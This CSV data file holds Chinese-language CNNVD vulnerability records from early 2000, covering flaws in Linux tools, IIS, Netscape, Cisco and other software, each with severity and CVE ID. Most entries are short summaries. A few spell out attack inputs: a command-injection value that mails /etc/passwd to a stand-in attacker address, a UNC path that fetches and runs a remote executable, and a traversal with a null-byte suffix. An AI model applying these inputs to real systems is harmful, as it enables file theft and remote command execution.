Name,Vuln ID,Published,Modified,Severity,Vuln Type,Vuln Descript,CVE ID
Check Point Firewall-1内部地址泄漏漏洞,CNNVD-200003-023,2000-03-11,2006-01-04,低危,授权问题,Firewall-1 3.0版本和4.0版本泄漏私人IP地址信息。远程攻击者利用此漏洞可以确定正在连接的主机的真正IP地址。,CVE-2000-0181
Linux atsar 文件操作漏洞,CNNVD-200003-024,2000-03-11,2005-05-02,高危,授权问题,在Linux的atsar包中的atsadc存在漏洞，不能正确验证输出文件的权限，本地用户可以利用这个漏洞获得根用户权限。,CVE-2000-0171
Netscape Enterprise Server漏洞,CNNVD-200003-025,2000-03-11,2010-12-02,中危,授权问题,Netscape Enterprise Server 中的主页发布功能存在漏洞，远程攻击者可以通过对提供Java applet程序的/publisher目录的GET请求浏览任意目录。,CVE-2000-0237
多个Linux厂商的imwheel漏洞,CNNVD-200003-026,2000-03-13,2005-05-02,高危,授权问题,imwheel中存在缓冲区溢出漏洞，本地用户可以通过imwheel-solo脚本和超长HOME环境变量获得根用户权限。,CVE-2000-0230
Microsoft SQL密码弱加密漏洞,CNNVD-200003-028,2000-03-14,2006-09-01,高危,授权问题,"Microsoft SQL 7.0存在漏洞，企业管理员在注册时，如果""Always prompt for login name and password"" 选项没有设置，就可以使用一个弱强度的用户名和密码登陆。",CVE-2000-0199
Sojourn搜索引擎CGI程序泄露文件漏洞,CNNVD-200003-027,2000-03-14,2005-05-02,低危,授权问题,Sojourn是一个商业搜索引擎软件。主页是http://www.generationterrorists.com/sojourn_superuser.html Sojourn存在一个安全问题，可导致系统文件内容泄露。 在正运行这个软件的Web服务器上，任何Web Server有权读取的文件都可能泄露给远程攻击者。Sojourn软件可以将一个Web站点分类组织，这些类别可以通过sojourn.cgi(Perl脚本)来访问，通常是用下列请求实现： http ://target/cgi-bin/sojourn.cgi?cat=categoryname 每一类都有一个与categoryname(类别名)对应的.txt文件.这个程序将在'cat'变量中的内容后面增加'.txt'扩展名，然后显示它的内容。然而这个程序允许攻击者在'cat'变量内容中输入'../'字符串，因此，攻击者可以访问Web服务器上任意的.txt文件(如果Webserver有读权限的话)，这个限制也能很容易的被绕过，攻击者只要在所要求的文件后面加上%00，就会屏蔽掉后面所加的.txt后缀。,CVE-2000-0180
Atrium Software Mercur WebView WebMail-Client的缓冲区溢出漏洞,CNNVD-200003-030,2000-03-15,2005-10-20,低危,授权问题,MERCUR WebView WebMail服务器存在缓冲区溢出漏洞，远程攻击者通过在GET请求中的超长mail_user参数触发拒绝服务。,CVE-2000-0239
SuSE Linux IMAP 漏洞,CNNVD-200003-029,2000-03-15,2010-12-02,超危,授权问题,SuSE Linux IMAP服务器存在漏洞，远程攻击者可以利用这个漏洞绕过IMAP认证并取得权限。,CVE-2000-0233
Atrium Software Mercur Mail Server 3.2 Multiple 的缓冲区溢出漏洞,CNNVD-200003-031,2000-03-15,2005-10-20,低危,授权问题,MERCUR 邮件服务器组中的POP3和IMAP存在缓冲区溢出漏洞，远程攻击者可以利用这个漏洞触发拒绝服务。,CVE-2000-0198
Oracle Web Listener批处理文件可用来远程执行任意命令漏洞,CNNVD-200003-032,2000-03-15,2006-04-07,高危,授权问题,"Oracle WebServer是一个与Oracle7 Server紧密集成的HTTP服务器，能够由存储在Oracle数据库的数据建立动态HTML文件。Oracle Web Listener是其组件之一，接收使用任何浏览器的用户发出的请求。对于静态(基于文件的)页面请求被监听进程立即处理，其功能即是一个HTTP服务器。 Oracle Web Listener for NT在安装了OAS后，缺省设置下，/ows-bin目录(映射到C:\orant\ows\4.0\bin)下安装了一些批处理文件，这些文件能被攻击者用来在服务器上执行任意命令。 攻击者只需要在批处理文件的后面增加""?&""字符串，以及要执行的命令即可。这些命令将 在""SYSTEM""级别运行。攻击者甚至不需要知道确切的批处理文件的名称，用'*'通配符就可以匹配目录下所有的批处理文件。 另外，攻击者也可以用UNC(Universal Naming Conversion)路径(例如：\\attacker.com\getadmin.exe)下载并执行远程主机上的程序。 <*链接：http://www.cerberus-infosec.co.uk/advisories.shtml *>",CVE-2000-0169
多个Linux厂商的kreatecd漏洞,CNNVD-200003-033,2000-03-16,2005-05-02,高危,配置错误,Linux kreatecd存在漏洞，它信任用来查找cdrecord程序的user-supplied路径，本地用户可以利用这个漏洞获得根权限。,CVE-2000-0231
诺顿杀毒软件漏洞,CNNVD-200003-034,2000-03-17,2010-12-02,低危,授权问题,Internet邮件网关中web服务器的诺顿杀毒软件存在漏洞，远程攻击者可以通过超长URL触发拒绝服务。,CVE-2000-0238
Netscape Enterprise Server 3.x Web Publishing泄露目录列表漏洞,CNNVD-200003-035,2000-03-17,2006-09-05,低危,配置错误,"Netscape Enterprise Server是一个Netscape公司开发的Web服务器。 在Netscape Enterprise Server 3.x版本中的""Web Publishing""(主页发布)功能将允许远程攻击者浏览根目录以及子目录内容。 远程攻击者可以通过提交一个包含Web Publishing标记的URL(?wp)请求来完成攻击。Netscape Enterprise Server默认安装时，""Directory Indexing""功能是打开的，可以通过禁止目录列表功能来防止上述问题。",CVE-2000-0236
Microsoft Windows Media License Manager的拒绝服务漏洞,CNNVD-200003-036,2000-03-17,2005-10-12,低危,授权问题,Microsoft Windows Media License Manager存在拒绝服务漏洞，远程攻击者可以通过发送异常请求导致管理器挂起触发这个漏洞，也称为“Malformed Media许可证请求”漏洞。,CVE-2000-0228
Lotus Domino Server ESMTP远程缓冲区溢出漏洞,CNNVD-200005-075,2000-03-18,2005-05-02,低危,授权问题,Lotus Domino服务器是一款基于WEB合作的应用程序架构，运行在Linux/Unix和Microsoft Windows操作系统平台下。 Lotus Domino服务器的ESMTP服务存在缓冲区溢出漏洞，远程攻击者可能可以利用这个漏洞进行拒绝服务攻击。 Lotus Domino服务器的ESMTP服务在处理'rcpt to'、'saml from'和'soml from'命令时缺乏缓冲区检查。如果Lotus Domino服务器接受到这三个命令中任意一个，并且参数超过4 KB，系统将崩溃并且只有重起才能恢复继续服务。,CVE-2000-0452
Cisco Secure PIX防火墙伪造TCP RST漏洞,CNNVD-200003-038,2000-03-20,2005-07-27,低危,授权问题,Cisco Secure PIX防火墙存在漏洞，不能正确辨识伪造的TCP置位包(RST)，远程攻击者可以利用这个漏洞迫使防火墙关闭合法连接。,CVE-2000-0613
Microsoft IIS 4.0分块传输编码的缓冲区溢出漏洞,CNNVD-200003-037,2000-03-20,2005-10-12,低危,授权问题,IIS 4.0存在漏洞，攻击者可以通过在POST或PUT命令中请求超大缓存消耗内存触发拒绝服务，也称为“块传输编码缓冲区溢出漏洞。”,CVE-2000-0226
vqSoft vqServer Plaintext的密码漏洞。,CNNVD-200003-039,2000-03-21,2005-10-20,低危,授权问题,vqSoft vqServer存在漏洞，它存储例如在server.cfg文件中的cleartext的密码之类的敏感信息，远程攻击者可以利用这个漏洞取得权限。,CVE-2000-0241
vqSoft vqServer漏洞,CNNVD-200003-040,2000-03-21,2010-12-02,低危,授权问题,vqSoft vqServer程序存在漏洞，远程攻击者可以通过URL中的/........../ 和.. (点点)的变种攻击读取任意文件。,CVE-2000-0240
Generic-NQS漏洞,CNNVD-200003-042,2000-03-22,2010-12-02,高危,授权问题,Generic-NQS中存在未知漏洞，本地用户可以利用这个漏洞获得根用户权限。,CVE-2000-0247
多个Linux厂商的gpm Setgid漏洞,CNNVD-200003-041,2000-03-22,2005-05-02,高危,授权问题,gpm package包中的gpm-root存在漏洞，他不能正确降低权限，本地用户可以通过开启gpm-root功能取得权限。,CVE-2000-0229
多个Linux厂商的域套接字的拒绝服务漏洞,CNNVD-200003-043,2000-03-23,2005-10-20,低危,授权问题,Linux 2.2.x kernel存在漏洞，他没有根据wmem_max参数的定义限制Unix域套接字的数量，本地用户可以通过请求超大数量的套接字触发拒绝服务。,CVE-2000-0227
GeoCel WindMail远程获取文件漏洞,CNNVD-200003-045,2000-03-25,2005-10-20,低危,配置错误,"WindMail是一个命令行的邮件工具，可以被集成到Perl CGI应用程序中，用来创建基于Web的邮件程序。 WindMail 3.0及以前版本实现上存在漏洞，远程攻击者可能利用此漏洞远程获取主机的任意已知文件名及路径的文件。 WindMail以两种方式工作：命令行模式和解释选项头模式。在命令行模式下，""-n""标记用于指定做为信件文本的文件的文件名，攻击者可以指定任意已知文件名和路径的文件。在解释选项头模式下，""-n""标记指定包含了一系列邮件头的文件，比如'Attach:'头，攻击者如果能在服务器上创建那个邮件头文件，也可以获得系统文件。",CVE-2000-0242
AnalogX SimpleServer WWW HTTP server 漏洞,CNNVD-200003-044,2000-03-25,2010-12-02,中危,授权问题,AnalogX SimpleServer:WWW HTTP server 1.03存在漏洞，远程攻击者可以通过对cgi-bin超短GET请求触发拒绝服务。,CVE-2000-0243
Napster client 缓冲区溢出漏洞,CNNVD-200003-046,2000-03-26,2010-12-02,低危,授权问题,Napster client beta 5存在缓冲区溢出漏洞，远程攻击者可以通过超长信息触发拒绝服务。,CVE-2000-0281
FreeBSD Orville-write 端口漏洞,CNNVD-200003-049,2000-03-27,2005-05-02,高危,授权问题,orville-write包中的huh程序存在缓冲区溢出漏洞，本地用户可以利用这个漏洞获得根用户权限。,CVE-2000-0235
IRIX Objectserver 漏洞,CNNVD-200003-048,2000-03-27,2005-05-02,高危,授权问题,SGI IRIX objectserver daemon存在漏洞，远程攻击者可以利用这个漏洞生成新账号。,CVE-2000-0245
Linux漏洞,CNNVD-200003-047,2000-03-27,2010-12-02,低危,授权问题,"Linux 2.2.x存在IP伪装漏洞，远程攻击者可以通过修改外部IP源地址和端口号来匹配已建连接,由内部接口的路由UDP包配合建立链接。",CVE-2000-0289
ICA Weak 弱加密漏洞,CNNVD-200003-050,2000-03-29,2005-10-20,高危,授权问题,Citrix ICA协议的用户认证使用弱加密存在漏洞。,CVE-2000-0244
NT / Windows 2000 TCP/IP 打印服务的拒绝服务漏洞,CNNVD-200003-051,2000-03-30,2005-05-02,低危,授权问题,Microsoft TCP/IP的打印服务存在拒绝服务漏洞，也称Unix的打印服务漏洞，攻击者可以通过异常的TCP/IP打印请求触发拒绝服务。,CVE-2000-0232
Novell Border Manager 审查跟踪代理的拒绝服务漏洞,CNNVD-200003-053,2000-03-30,2005-05-02,中危,授权问题,Novell BorderManager 3.5存在漏洞，远程攻击者可以通过在2000端口的telnet连接中键入enter键促发拒绝服务。,CVE-2000-0152
Microsoft IIS UNC映射虚拟主机漏洞,CNNVD-200003-052,2000-03-30,2006-09-25,低危,授权问题,IIS 4.0 and 5.0存在漏洞，如果虚拟路径映射到UNC共享便不能正确处理ISAPI extension，远程攻击者可以利用这个漏洞读取ASP和其他文件的源码，也称“虚拟UNC共享”漏洞。,CVE-2000-0246
Microsoft Windows Index Server '%20'远程ASP源码泄露漏洞(MS00-006),CNNVD-200003-056,2000-03-31,2005-05-02,低危,授权问题,Microsoft Index Server是Windows NT 4.0可选安装包中包括的一个基于Web的搜索引擎，在Windows 2000系统中作为一个服务安装。 Index Server的Webhits.dll实现上存在漏洞，远程攻击可能利用此漏洞读取系统上ASP脚本的源码或其它系统文件的内容。Cerberus安全小组现在微软的Index Server服务上发现了第三个漏洞。对于运行在IIS4或IIS5上的Index Server，即使您把最近的补丁给打上了或者没有.htw文件，都同样受到此漏洞的影响。其中的风险包括系统中的很多ASP页面的源代码或者是象global.asa的文件会被攻击者查看。这些文件包含了很多敏感信息，象用户的ID和密码、还有数据源、数据库用户名及密码。这些都会给攻击者攻击站点/网络提供便利。 存在该问题的其中一个原因是因为'null.htw'没有一个映射到系统中任意文件的真实文件。另外，它是一个在内存中的'虚拟文件'，因此，即使没有一个真实的.htw文件在系统中也同样存在风险。任何对null.htw的请求都由webhits.dll来处理。,CVE-2000-0302
4D Inc. WebSTAR的拒绝服务攻击,CNNVD-200003-055,2000-03-31,2005-10-21,低危,授权问题,Webstar HTTP 服务器存在缓冲区溢出漏洞，远程攻击者可以通过超长GET请求触发拒绝服务。,CVE-2000-0290
Cobalt Raq Apache .htaccess Disclosure 漏洞,CNNVD-200003-054,2000-03-31,2006-08-28,低危,配置错误,Cobalt RaQ2 和 RaQ3按access.conf文件默认配置存在漏洞，远程攻击者可以利用这个漏洞查看.htaccess 文件中的敏感内容。,CVE-2000-0234
SalesLogix eViewer远程拒绝服务攻击漏洞,CNNVD-200008-001,2000-03-31,2005-05-02,低危,授权问题,SalesLogix eViewer是SalesLogix 2000软件包带的一个Web CGI程序。 SalesLogix的CGI管理实现上存在漏洞，远程攻击者可能利用此漏洞非授权执行管理功能。,CVE-2000-0278
fcheck漏洞,CNNVD-200003-057,2000-03-31,2010-12-02,高危,授权问题,fcheck存在漏洞，本地用户可以通过在fcheck处理的文件名中嵌入shell元字符取得特权。,CVE-2000-0296
Netscape漏洞,CNNVD-200004-001,2000-04-01,2010-12-02,低危,授权问题,Netscape 存在漏洞，远程攻击者可以通过JavaScript从Netscaped的用户缓存中读取信息。,CVE-1999-0790
Real Networks RealPlayer 6/7本地缓冲区溢出漏洞,CNNVD-200004-005,2000-04-03,2006-01-05,低危,授权问题,RealNetworks RealPlayer client versions 6 和 7 中纯正缓冲区溢出漏洞，远程攻击者可以通过超长本地URL触发拒绝服务。,CVE-2000-0280
CommuniGate漏洞,CNNVD-200004-003,2000-04-03,2010-12-02,中危,授权问题,CommuniGate Pro 3.2.5及早期的web管理接口存在漏洞，远程攻击者可以通过..攻击读取任意文件。,CVE-2000-0634
Microsoft Excel XML 漏洞,CNNVD-200004-004,2000-04-03,2005-10-12,高危,授权问题,Microsoft Excel 97 and 2000存在漏洞，在对外部文本文件执行Excel宏语言(XLM)时没有警告用户，远程攻击者可以利用这个漏洞执行宏病毒，也称“XLM 文本宏”漏洞。,CVE-2000-0277
"Allaire Forums 的""rightAccessAllForums"" 漏洞",CNNVD-200004-002,2000-04-03,2005-05-02,中危,授权问题,Allaire Forums 2.0.5存在漏洞，远程攻击者可以通过rightAccessAllForums或rightModerateAllForums变量绕过访问限制到达安全会议。,CVE-2000-0297
WebObjects远程溢出漏洞,CNNVD-200004-006,2000-04-04,2005-10-20,低危,授权问题,WebObjects Developer 4.5 包中的WebObjects.exe存在漏洞，远程攻击者可以通过例如Accept的超长头部的HTTP请求触发拒绝服务。,CVE-2000-0299
Nbase-Xyplex EdgeBlaster漏洞,CNNVD-200004-007,2000-04-05,2010-12-02,低危,授权问题,Nbase-Xyplex EdgeBlaster 路由器存在漏洞，远程攻击者可以通过扫描FormMail CGI程序触发拒绝服务。,CVE-2000-0255
HP VirtualVault Aliased IP地址漏洞,CNNVD-200004-009,2000-04-06,2005-05-02,低危,其他,HP-UX 11.04 VirtualVault存在漏洞，它通过多别名IP地址的接口发送数据到无权限进程。,CVE-2000-0251
Ipswitch IMAIL server漏洞,CNNVD-200004-008,2000-04-06,2010-12-02,低危,授权问题,Ipswitch IMAIL server 6.02和早期版本，远程攻击者可以通过AUTH CRAM-MD5命令触发拒绝服务。,CVE-2000-0301
Symantec pcAnywhere弱加密漏洞,CNNVD-200004-010,2000-04-06,2005-10-20,超危,授权问题,PcAnywhere 9.x的缺省加密算法强度弱，存在漏洞，远程攻击者可以利用这个漏洞嗅探和破译 PcAnywhere或NT的域账号。,CVE-2000-0300
BeOS IP包长度域漏洞,CNNVD-200004-011,2000-04-07,2005-08-24,低危,其他,BeOS存在漏洞，远程攻击者通过长度域少于头部的异常包触发拒绝服务。,CVE-2000-0279
Microsoft Windows 2000 无人值守预安装漏洞,CNNVD-200004-012,2000-04-07,2005-05-02,高危,配置错误,Windows 2000无人值守安装的OEMPreinstall选项存在漏洞，它对所有用户和缺省用户目录设置非安全的权限。,CVE-2000-0298
PCAnywhere漏洞,CNNVD-200004-013,2000-04-09,2010-12-02,低危,授权问题,PCAnywhere存在漏洞，远程攻击者可以通过在PCAnywhere 提供一个登陆提示前终止连接触发拒绝服务。,CVE-2000-0273
BeOS漏洞,CNNVD-200004-016,2000-04-10,2010-12-02,低危,授权问题,BeOS 4.5 and 5.0 存在漏洞，本地用户可以通过使用37号中断的这种异常的直接系统调用方式触发拒绝服务。,CVE-2000-0276
CRYPTOCard CRYPTOAdmin 4.1的弱加密漏洞,CNNVD-200004-017,2000-04-10,2005-10-20,低危,授权问题,PalmOS的CRYPTOCard CryptoAdmin使用弱加密存储用户的PIN号存在漏洞，攻击者可以在破解PIN后通过访问.PDB文件生成有效的PT-1符号。,CVE-2000-0275
healthd缓冲区溢出错误,CNNVD-200004-014,2000-04-10,2005-05-02,高危,授权问题,FreeBSD的healthd存在缓冲区溢出漏洞，本地用户可以利用这个漏洞获得根用户权限。,CVE-2000-0294
Bray Systems 1.5 Linux Trustee超长路径名漏洞,CNNVD-200004-015,2000-04-10,2005-05-02,低危,授权问题,The Linux trustees kernel路径存在漏洞，攻击者可以通过使用超长名访问文件或目录来触发拒绝服务。,CVE-2000-0274
dansie cart.pl漏洞,CNNVD-200004-021,2000-04-11,2010-12-02,超危,授权问题,dansie消费卡中的cart.pl应用程序存在漏洞，远程攻击者可以通过隐藏表单字段修改敏感购买信息。,CVE-2000-0253
SCO Unixware 特权调试程序漏洞,CNNVD-200004-018,2000-04-11,2005-05-02,高危,授权问题,SCO UnixWare 特权过程系统存在漏洞，本地用户可以通过使用例如gdb的调试器在特权进程执行前将trap插入_init处从而获得根用户权限。,CVE-1999-0979
NT无人值守文件安装漏洞,CNNVD-200004-020,2000-04-11,2005-05-02,高危,配置错误,NT 4.0在无人值守安装后的文件安装存在漏洞，可能包括例如本地管理员密码的敏感信息。,CVE-1999-0701
dansie cart.pl漏洞,CNNVD-200004-022,2000-04-11,2010-12-02,低危,授权问题,dansie消费卡中的cart.pl应用程序存在漏洞，远程攻击者可以通过表单变量中的shell元字符执行命令。,CVE-2000-0252
Sapphire/Web 验证漏洞,CNNVD-200004-023,2000-04-11,2005-05-02,高危,授权问题,Bluestone Sapphire的web服务存在漏洞，攻击者可以通过简单猜测会话IDs劫持会话。,CVE-1999-0699
Sybase Power Dynamo 目录遍历漏洞,CNNVD-200004-019,2000-04-11,2005-05-02,低危,其他,Sybase PowerDynamo的个人web服务存在漏洞，攻击者可以通过 ..(点点)攻击读取任意文件。,CVE-1999-0695
AVM KEN! 1.3.10目录遍历漏洞,CNNVD-200004-028,2000-04-12,2005-05-02,低危,授权问题,AVM KEN!的web服务器存在漏洞，远程攻击者可以通过..(点点)攻击读取任意文件。,CVE-2000-0261
IRIX Performance Copilot漏洞,CNNVD-200004-029,2000-04-12,2010-12-02,中危,授权问题,IRIX Performance Copilot的缺省安装存在漏洞，远程攻击者可以通过pmcd 守护进程访问敏感系统信息。,CVE-2000-0283
BizDB bizdb-search.cgi搜索引擎CGI导致用户远程执行shell命令,CNNVD-200004-030,2000-04-12,2005-05-02,超危,授权问题,"BizDB是Cnctek开发的数据库以及搜索引擎软件。 BizDB安装程序中包含一个CGI脚本：bizdb-search.cgi，它被用来搜索bizdb数据库。攻击者可以通过修改CGI参数使bizdb-search.cgi在Web服务器上执行shell命令。 bizdb-search.cgi使用""open""命令来打开数据库文件，该文件名是由""dbname""变量接收 用户输入的。它并没有对输入数据进行检查。攻击者可以用带有管道符的shell命令替换掉 正常的数据库文件名：""bizdb""，例如： "";cat%20/etc/passwd|mail%20attacker@evil.site|"" 这样，/etc/passwd文件的内容就会被发送到攻击者的邮箱中去。这个脚本会检查是否 HTTP_REFERER变量是否被正确设置，但是这个变量是很容易被伪造的，因此并不能真正 阻止攻击的发生。",CVE-2000-0287
Microsoft NT 4.0 OffloadModExpo注册权限漏洞。,CNNVD-200004-026,2000-04-12,2005-10-20,高危,配置错误,在Windows NT 4.0中的OffloadModExpo的Cryptography\Offload缺省权限注册键值存在漏洞，本地用户可以利用这个漏洞获得其他用户的密码危害他人。,CVE-2000-0259
Microsoft IIS 4.0/5.0 转义字符漏洞,CNNVD-200004-027,2000-04-12,2005-10-12,高危,授权问题,IIS 4.0 and 5.0存在漏洞，攻击者可以通过发送很多包含大量转义字符的URLs触发拒绝访问，也称“无数转义字符”漏洞。,CVE-2000-0258
Infonautics getdoc.cgi 漏洞,CNNVD-200004-024,2000-04-12,2010-12-02,低危,授权问题,Infonautics getdoc.cgi 存在漏洞，远程攻击者可以通过修改表单变量绕过付款流程访问文档。,CVE-2000-0288
AVM KEN! 1.3.10目录遍历漏洞,CNNVD-200004-025,2000-04-12,2005-05-02,低危,授权问题,AVM KEN! ISDN 代理服务器存在漏洞，远程攻击者可以通过异常请求触发拒绝服务。,CVE-2000-0262
Web+shopping TalentSoft webpsvr漏洞,CNNVD-200004-031,2000-04-12,2010-12-02,低危,授权问题,Web+shopping 卡应用程序的TalentSoft webpsvr守护进程存在漏洞，远程攻击者可以通过针对webplus CGI 程序的.. 攻击读取任意文件。,CVE-2000-0282
Microsoft IIS 4.0 FrontPage 98扩展察看CGI脚本源代码后门漏洞(MS00-025),CNNVD-200004-032,2000-04-14,2005-10-12,高危,授权问题,"FrontPage 98 Extensions是微软的一个产品，包括PWS和IIS版本，可以让网页设计人员方便的直接用FrontPage直接连接到PWS或者IIS上进行网页创作。 FrontPage 98 Extensions包含的两个动态连接库文件存在两个后门，可以被攻击者利用来查看CGI程序源代码。 微软IIS FrontPage 98 extensions所带的两个动态连接库dvwssr.dll和mtd2lv.dll存在一个隐藏后门。这个后门实际上是一个隐藏的字符串:""Netscape engineers are weenies!""。攻击者可以将要下载的.asp文件(或者global.asa)名用这隐含字符串编码，并提供给dvwssr.dll就可能远程下载web服务器上的.asp或者.asa源代码。",CVE-2000-0260
Microsoft Windows漏洞,CNNVD-200004-033,2000-04-14,2019-05-08,高危,其他,"Microsoft Windows是美国微软（Microsoft）公司的一套个人设备使用的操作系统。 Microsoft Windows 98, NT 4.0, 2000, 和 XP域名分析器的缺省配置存在漏洞，导致Windows接收未请求的主机的DNS更新，远程攻击者可以利用这个漏洞破坏DNS缓存。",CVE-2000-1218
dansie cart.pl 漏洞,CNNVD-200004-034,2000-04-14,2010-12-02,低危,授权问题,dansie消费卡的cart.pl应用程序存在漏洞，远程攻击者可以通过引用env，db或vars表单变量的URL获得消费卡的数据库。,CVE-2000-0254
QNX crypt() 漏洞,CNNVD-200004-035,2000-04-14,2006-09-25,高危,授权问题,QNX中的crypt函数用弱加密存在漏洞，本地用户可以利用这个漏洞解密。,CVE-2000-0250
华盛顿大学的imapd的缓冲区溢出漏洞,CNNVD-200004-040,2000-04-16,2005-10-20,高危,授权问题,华盛顿大学的4.7版本的imapd存在缓冲区溢出漏洞，用户可以通过LIST或其他指令以合法账号执行命令。,CVE-2000-0284
Red Hat Linux X font server xfs漏洞,CNNVD-200004-038,2000-04-16,2010-12-02,低危,授权问题,Red Hat Linux 6.x中的X font server xfs存在漏洞，攻击者可以通过异常请求触发拒绝服务。,CVE-2000-0263
XFree86 Xserver缓冲区溢出漏洞,CNNVD-200004-037,2000-04-16,2005-05-02,高危,授权问题,XFree86 3.3.x存在缓冲区溢出漏洞，本地用户可以通过超长-xkbmap变量执行任意指令。,CVE-2000-0285
Star Office 5.1 缓冲区溢出漏洞,CNNVD-200004-036,2000-04-16,2005-10-20,中危,授权问题,Star Office 5.1存在缓冲区溢出漏洞，攻击者可以通过在文档中嵌入超长URL触发拒绝服务。,CVE-2000-0291
Multiple Vendor X Font Server拒绝服务和缓冲区溢出漏洞,CNNVD-200004-039,2000-04-16,2005-10-20,低危,授权问题,X fontserver xfs存在漏洞，本地用户可以通过对服务器的异常输入触发拒绝服务。,CVE-2000-0286
Panda Security漏洞,CNNVD-200004-042,2000-04-17,2010-12-02,中危,授权问题,Panda Security 3.0存在漏洞，用户可以通过它的增加/删除子程序卸载Panda软件。,CVE-2000-0265
Panda Security 3.0 的多个漏洞,CNNVD-200004-041,2000-04-17,2005-05-02,低危,授权问题,未使能注册表编辑的Panda Security 3.0存在漏洞，用户可以通过直接执行.reg文件或其他方法编辑注册表和获取特权。,CVE-2000-0264
GNU Emacs本地窃听漏洞,CNNVD-200004-044,2000-04-18,2005-10-20,低危,授权问题,Emacs 20存在漏洞，它在启动新的子进程时没有为从设备PTY正确设置权限，本地用户可以利用这个漏洞读取或修改Emacs与子进程间的通信。,CVE-2000-0269
Microsoft Internet Explorer 安全漏洞,CNNVD-200004-045,2000-04-18,2021-07-26,低危,其他,Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Internet Explorer 5.01存在安全漏洞，远程攻击者可以通过与Java JSObject共同作用的恶意程序修改DOM属性，对任意Javascript UR设置IFRAME，从而绕过cross frame安全策略。,CVE-2000-0266
GNU Emacs本地窃听漏洞,CNNVD-200004-047,2000-04-18,2005-10-20,低危,授权问题,Emacs 20中的make-temp-name Lisp函数存在漏洞，它在新建的临时文件时以可预料的名字命名，攻击者可以利用这个漏洞引导符号连接攻击。,CVE-2000-0270
GNU Emacs本地窃听漏洞,CNNVD-200004-043,2000-04-18,2005-10-20,中危,授权问题,Emacs 20中的read-passwd和其他Lisp函数没有正确清除最近键入字符的历史信息，存在漏洞，攻击者可以利用这个漏洞读取非加密的口令。,CVE-2000-0271
HP asecure audio.sec漏洞,CNNVD-200004-046,2000-04-18,2010-12-02,中危,授权问题,HP asecure以非安全权限建立audio.sec音频安全文件存在漏洞，本地用户可以利用这个漏洞触发访问拒绝或获取更大的权限。,CVE-2000-0083
MS Frontpage Image Mapper的缓冲区溢出漏洞。,CNNVD-200004-048,2000-04-19,2005-10-20,高危,授权问题,FrontPage 97 和 98 的Server Extensions中的htimage.exe 和 Imagemap.exe存在缓冲区溢出漏洞，用户可以利用这个漏洞使自己的操作行为在web站点上不留痕迹，也称作“Server-Side Image Map 组件”漏洞。,CVE-2000-0256
NetWare 缓冲区溢出漏洞,CNNVD-200004-050,2000-04-19,2010-12-02,高危,授权问题,NetWare的远程web管理工具存在缓冲区溢出漏洞，远程攻击者可以利用这个漏洞触发拒绝服务或通过一个超长URL执行命令。,CVE-2000-0257
Adtran MX2800 M13 Multiplexer漏洞,CNNVD-200004-049,2000-04-19,2010-12-02,低危,授权问题,Adtran MX2800 M13 Multiplexer存在漏洞，远程攻击者可以利用以太网的ping洪泛触发拒绝服务，这将导致设备瘫痪。,CVE-2000-0292
Windows 2000活动对象目录属性漏洞,CNNVD-200004-053,2000-04-20,2005-10-12,低危,授权问题,Windows 2000域控制器存在漏洞，恶意用户可以通过修改未受保护的属性修改活动目录，也称为“混合对象访问”漏洞。,CVE-2000-0311
Microsoft Windows缓冲区溢出漏洞,CNNVD-200004-052,2000-04-20,2010-12-02,低危,授权问题,Microsoft 的 Windows NT 和 Windows 2000的命令进程(CMD.EXE)存在缓冲区溢出漏洞，本地用户可以通过超长环境变量触发拒绝服务，也称为“异常环境变量”漏洞。,CVE-2000-0331
Cisco IOS TELNET环境变量处理拒绝服务漏洞,CNNVD-200004-051,2000-04-20,2006-08-28,低危,授权问题,"Cisco Internet Operating System(IOS)是一款使用于CISCO路由器上的操作系统。 Cisco IOS软件的某些版本在处理Telnet传递的环境变量时存在问题，远程攻击者可能利用此漏洞导致设备拒绝服务。 当一个特定的Telnet参数(""ENVIRON""变量)传送给Cisco IOS Telnet服务程序，将导致IOS自动重载。这种攻击可以重复持续进行，因而形成一种拒绝服务攻击。 <*链接：http://www.cisco.com/warp/public/707/iostelnetopt-pub.shtml *>",CVE-2000-0268
Cisco Catalyst使能密码旁路漏洞,CNNVD-200004-054,2000-04-20,2005-10-12,中危,授权问题,Cisco Catalyst 5.4.x存在漏洞，用户可以访问“使能”模式而无需密码。,CVE-2000-0267
RealNetworks RealServer漏洞,CNNVD-200004-055,2000-04-20,2010-12-02,中危,授权问题,RealNetworks RealServer存在漏洞，远程攻击者可以通过发送异常输入到服务器的7070端口触发拒绝服务。,CVE-2000-0272
